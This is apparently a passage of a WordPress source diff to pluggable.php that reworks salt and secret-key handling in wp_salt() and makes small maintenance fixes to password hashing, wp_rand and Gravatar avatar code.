- * Get salt to add to hashes to help prevent attacks.
+ * Get salt to add to hashes.
  *
- * The secret key is located in two places: the database in case the secret key
- * isn't defined in the second place, which is in the wp-config.php file. If you
- * are going to set the secret key, then you must do so in the wp-config.php
- * file.
+ * Salts are created using secret keys. Secret keys are located in two places:
+ * in the database and in the wp-config.php file. The secret key in the database
+ * is randomly generated and will be appended to the secret keys in wp-config.php.
  *
- * The secret key in the database is randomly generated and will be appended to
- * the secret key that is in wp-config.php file in some instances. It is
- * important to have the secret key defined or changed in wp-config.php.
- *
- * If you have installed WordPress 2.5 or later, then you will have the
- * SECRET_KEY defined in the wp-config.php already. You will want to change the
- * value in it because hackers will know what it is. If you have upgraded to
- * WordPress 2.5 or later version from a version before WordPress 2.5, then you
- * should add the constant to your wp-config.php file.
- *
- * Below is an example of how the SECRET_KEY constant is defined with a value.
- * You must not copy the below example and paste into your wp-config.php. If you
- * need an example, then you can have a
- * {@link https://api.wordpress.org/secret-key/1.1/ secret key created} for you.
+ * The secret keys in wp-config.php should be updated to strong, random keys to maximize
+ * security. Below is an example of how the secret key constants are defined.
+ * Do not paste this example directly into wp-config.php. Instead, have a
+ * {@link https://api.wordpress.org/secret-key/1.1/salt/ secret key created} just
+ * for you.
  *
  * <code>
- * define('SECRET_KEY', 'mAry1HadA15|\/|b17w55w1t3asSn09w');
+ * define('AUTH_KEY',         ' Xakm<o xQy rw4EMsLKM-?!T+,PFF})H4lzcW57AF0U@N@< >M%G4Yt>f`z]MON');
+ * define('SECURE_AUTH_KEY',  'LzJ}op]mr|6+![P}Ak:uNdJCJZd>(Hx.-Mh#Tz)pCIU#uGEnfFz|f ;;eU%/U^O~');
+ * define('LOGGED_IN_KEY',    '|i|Ux`9<p-h$aFf(qnT:sDO:D1P^wZ$$/Ra@miTJi9G;ddp_<q}6H1)o|a +&JCM');
+ * define('NONCE_KEY',        '%:R{[P|,s.KuMltH5}cI;/k<Gx~j!f0I)m_sIyu+&NJZ)-iO>z7X>QYR0Z_XnZ@|');
+ * define('AUTH_SALT',        'eZyT)-Naw]F8CwA*VaW#q*|.)g@o}||wf~@C-YSt}(dh_r6EbI#A,y|nU2{B#JBW');
+ * define('SECURE_AUTH_SALT', '!=oLUTXh,QW=H `}`L|9/^4-3 STz},T(w}W<I`.JjPi)<Bmf1v,HpGe}T1:Xt7n');
+ * define('LOGGED_IN_SALT',   '+XSqHc;@Q*K_b|Z?NC[3H!!EONbh.n<+=uKR:>*c(u`g~EJBf#8u#R{mUEZrozmm');
+ * define('NONCE_SALT',       'h`GXHhD>SLWVfg1(1(N{;.V!MoE(SfbA_ksP@&`+AycHcAV$+?@3q+rxV{%^VyKT');
  * </code>
  *
  * Salting passwords helps against tools which has stored hashed values of
- * common dictionary strings. The added values makes it harder to crack if given
- * salt string is not weak.
+ * common dictionary strings. The added values makes it harder to crack.
  *
  * @since 2.5
- * @link https://api.wordpress.org/secret-key/1.1/ Create a Secret Key for wp-config.php
  *
- * @param string $scheme Authentication scheme
+ * @link https://api.wordpress.org/secret-key/1.1/salt/ Create secrets for wp-config.php
+ *
+ * @param string $scheme Authentication scheme (auth, secure_auth, logged_in, nonce)
  * @return string Salt value
  */
-function wp_salt($scheme = 'auth') {
-	global $wp_default_secret_key;
-	$secret_key = '';
-	if ( defined('SECRET_KEY') && ('' != SECRET_KEY) && ( $wp_default_secret_key != SECRET_KEY) )
-		$secret_key = SECRET_KEY;
+function wp_salt( $scheme = 'auth' ) {
+	static $cached_salts = array();
+	if ( isset( $cached_salts[ $scheme ] ) )
+		return apply_filters( 'salt', $cached_salts[ $scheme ], $scheme );
 
-	if ( 'auth' == $scheme ) {
-		if ( defined('AUTH_KEY') && ('' != AUTH_KEY) && ( $wp_default_secret_key != AUTH_KEY) )
-			$secret_key = AUTH_KEY;
-
-		if ( defined('AUTH_SALT') && ('' != AUTH_SALT) && ( $wp_default_secret_key != AUTH_SALT) ) {
-			$salt = AUTH_SALT;
-		} elseif ( defined('SECRET_SALT') && ('' != SECRET_SALT) && ( $wp_default_secret_key != SECRET_SALT) ) {
-			$salt = SECRET_SALT;
-		} else {
-			$salt = get_site_option('auth_salt');
-			if ( empty($salt) ) {
-				$salt = wp_generate_password( 64, true, true );
-				update_site_option('auth_salt', $salt);
+	static $duplicated_keys;
+	if ( null === $duplicated_keys ) {
+		$duplicated_keys = array( 'put your unique phrase here' => true );
+		foreach ( array( 'AUTH', 'SECURE_AUTH', 'LOGGED_IN', 'NONCE', 'SECRET' ) as $first ) {
+			foreach ( array( 'KEY', 'SALT' ) as $second ) {
+				if ( ! defined( "{$first}_{$second}" ) )
+					continue;
+				$value = constant( "{$first}_{$second}" );
+				$duplicated_keys[ $value ] = isset( $duplicated_keys[ $value ] );
 			}
 		}
-	} elseif ( 'secure_auth' == $scheme ) {
-		if ( defined('SECURE_AUTH_KEY') && ('' != SECURE_AUTH_KEY) && ( $wp_default_secret_key != SECURE_AUTH_KEY) )
-			$secret_key = SECURE_AUTH_KEY;
+	}
 
-		if ( defined('SECURE_AUTH_SALT') && ('' != SECURE_AUTH_SALT) && ( $wp_default_secret_key != SECURE_AUTH_SALT) ) {
-			$salt = SECURE_AUTH_SALT;
-		} else {
-			$salt = get_site_option('secure_auth_salt');
-			if ( empty($salt) ) {
-				$salt = wp_generate_password( 64, true, true );
-				update_site_option('secure_auth_salt', $salt);
-			}
-		}
-	} elseif ( 'logged_in' == $scheme ) {
-		if ( defined('LOGGED_IN_KEY') && ('' != LOGGED_IN_KEY) && ( $wp_default_secret_key != LOGGED_IN_KEY) )
-			$secret_key = LOGGED_IN_KEY;
+	$key = $salt = '';
+	if ( defined( 'SECRET_KEY' ) && SECRET_KEY && empty( $duplicated_keys[ SECRET_KEY ] ) )
+		$key = SECRET_KEY;
+	if ( 'auth' == $scheme && defined( 'SECRET_SALT' ) && SECRET_SALT && empty( $duplicated_keys[ SECRET_SALT ] ) )
+		$salt = SECRET_SALT;
 
-		if ( defined('LOGGED_IN_SALT') && ('' != LOGGED_IN_SALT) && ( $wp_default_secret_key != LOGGED_IN_SALT) ) {
-			$salt = LOGGED_IN_SALT;
-		} else {
-			$salt = get_site_option('logged_in_salt');
-			if ( empty($salt) ) {
-				$salt = wp_generate_password( 64, true, true );
-				update_site_option('logged_in_salt', $salt);
-			}
-		}
-	} elseif ( 'nonce' == $scheme ) {
-		if ( defined('NONCE_KEY') && ('' != NONCE_KEY) && ( $wp_default_secret_key != NONCE_KEY) )
-			$secret_key = NONCE_KEY;
-
-		if ( defined('NONCE_SALT') && ('' != NONCE_SALT) && ( $wp_default_secret_key != NONCE_SALT) ) {
-			$salt = NONCE_SALT;
-		} else {
-			$salt = get_site_option('nonce_salt');
-			if ( empty($salt) ) {
-				$salt = wp_generate_password( 64, true, true );
-				update_site_option('nonce_salt', $salt);
+	if ( in_array( $scheme, array( 'auth', 'secure_auth', 'logged_in', 'nonce' ) ) ) {
+		foreach ( array( 'key', 'salt' ) as $type ) {
+			$const = strtoupper( "{$scheme}_{$type}" );
+			if ( defined( $const ) && constant( $const ) && empty( $duplicated_keys[ constant( $const ) ] ) ) {
+				$$type = constant( $const );
+			} elseif ( ! $$type ) {
+				$$type = get_site_option( "{$scheme}_{$type}" );
+				if ( ! $$type ) {
+					$$type = wp_generate_password( 64, true, true );
+					update_site_option( "{$scheme}_{$type}", $$type );
+				}
 			}
 		}
 	} else {
-		// ensure each auth scheme has its own unique salt
-		$salt = hash_hmac('md5', $scheme, $secret_key);
+		if ( ! $key ) {
+			$key = get_site_option( 'secret_key' );
+			if ( ! $key ) {
+				$key = wp_generate_password( 64, true, true );
+				update_site_option( 'secret_key', $key );
+			}
+		}
+		$salt = hash_hmac( 'md5', $scheme, $key );
 	}
 
-	return apply_filters('salt', $secret_key . $salt, $scheme);
+	$cached_salts[ $scheme ] = $key . $salt;
+	return apply_filters( 'salt', $cached_salts[ $scheme ], $scheme );
 }
 endif;
 
@@ -1487,7 +1413,7 @@ function wp_hash_password($password) {
 	if ( empty($wp_hasher) ) {
 		require_once( ABSPATH . 'wp-includes/class-phpass.php');
 		// By default, use the portable hash from phpass
-		$wp_hasher = new PasswordHash(8, TRUE);
+		$wp_hasher = new PasswordHash(8, true);
 	}
 
 	return $wp_hasher->HashPassword($password);
@@ -1500,7 +1426,7 @@ if ( !function_exists('wp_check_password') ) :
  *
  * Maintains compatibility between old version and the new cookie authentication
  * protocol using PHPass library. The $hash parameter is the encrypted password
- * and the function compares the plain text password when encypted similarly
+ * and the function compares the plain text password when encrypted similarly
  * against the already encrypted password to see if they match.
  *
  * For integration with other applications, this function can be overwritten to
@@ -1535,7 +1461,7 @@ function wp_check_password($password, $hash, $user_id = '') {
 	if ( empty($wp_hasher) ) {
 		require_once( ABSPATH . 'wp-includes/class-phpass.php');
 		// By default, use the portable hash from phpass
-		$wp_hasher = new PasswordHash(8, TRUE);
+		$wp_hasher = new PasswordHash(8, true);
 	}
 
 	$check = $wp_hasher->CheckPassword($password, $hash);
@@ -1574,13 +1500,13 @@ function wp_generate_password( $length = 12, $special_chars = true, $extra_speci
 endif;
 
 if ( !function_exists('wp_rand') ) :
- /**
+/**
  * Generates a random number
  *
  * @since 2.6.2
  *
- * @param int $min Lower limit for the generated number (optional, default is 0)
- * @param int $max Upper limit for the generated number (optional, default is 4294967295)
+ * @param int $min Lower limit for the generated number
+ * @param int $max Upper limit for the generated number
  * @return int A random number between min and max
  */
 function wp_rand( $min = 0, $max = 0 ) {
@@ -1609,10 +1535,12 @@ function wp_rand( $min = 0, $max = 0 ) {
 
 	$value = abs(hexdec($value));
 
+	// Some misconfigured 32bit environments (Entropy PHP, for example) truncate integers larger than PHP_INT_MAX to PHP_INT_MAX rather than overflowing them to floats.
+	$max_random_number = 3000000000 === 2147483647 ? (float) "4294967295" : 4294967295; // 4294967295 = 0xffffffff
+
 	// Reduce the value to be within the min - max range
-	// 4294967295 = 0xffffffff = max random number
 	if ( $max != 0 )
-		$value = $min + (($max - $min + 1) * ($value / (4294967295 + 1)));
+		$value = $min + ( $max - $min + 1 ) * $value / ( $max_random_number + 1 );
 
 	return abs(intval($value));
 }
@@ -1650,7 +1578,7 @@ if ( !function_exists( 'get_avatar' ) ) :
  * @param int|string|object $id_or_email A user ID,  email address, or comment object
  * @param int $size Size of the avatar image
  * @param string $default URL to a default image to use if no avatar is available
- * @param string $alt Alternate text to use in image tag. Defaults to blank
+ * @param string $alt Alternative text to use in image tag. Defaults to blank
  * @return string <img> tag for the user's avatar
 */
 function get_avatar( $id_or_email, $size = '96', $default = '', $alt = false ) {
@@ -1698,7 +1626,7 @@ function get_avatar( $id_or_email, $size = '96', $default = '', $alt = false ) {
 	}
 
 	if ( !empty($email) )
-		$email_hash = md5( strtolower( $email ) );
+		$email_hash = md5( strtolower( trim( $email ) ) );
 
 	if ( is_ssl() ) {
 		$host = 'https://secure.gravatar.com';
@@ -1712,11 +1640,11 @@ function get_avatar( $id_or_email, $size = '96', $default = '', $alt = false ) {
 	if ( 'mystery' == $default )
 		$default = "$host/avatar/ad516503a11cd5ca435acc9bb6523536?s={$size}"; // ad516503a11cd5ca435acc9bb6523536 == md5('unknown@gravatar.com')
 	elseif ( 'blank' == $default )
-		$default = includes_url('images/blank.gif');
+		$default = $email ? 'blank' : includes_url( 'images/blank.gif' );
 	elseif ( !empty($email) && 'gravatar_default' == $default )
 		$default = '';
 	elseif ( 'gravatar_default' == $default )
-		$default = "$host/avatar/s={$size}";
+		$default = "$host/avatar/?s={$size}";
 	elseif ( empty($email) )
 		$default = "$host/avatar/?d=$default&amp;s={$size}";
 	elseif ( strpos($default, 'http://') === 0 )
@@ -1778,8 +1706,8 @@ function wp_text_diff( $left_string, $right_string, $args = null ) {
 	$left_string  = normalize_whitespace($left_string);
 	$right_string = normalize_whitespace($right_string);
 
-	$left_lines  = split("\n", $left_string);
-	$right_lines = split("\n", $right_string);
+	$left_lines  = explode("\n", $left_string);
+	$right_lines = explode("\n", $right_string);
 
 	$text_diff = new Text_Diff($left_lines, $right_lines);
 	$renderer  = new WP_Text_Diff_Renderer_Table();
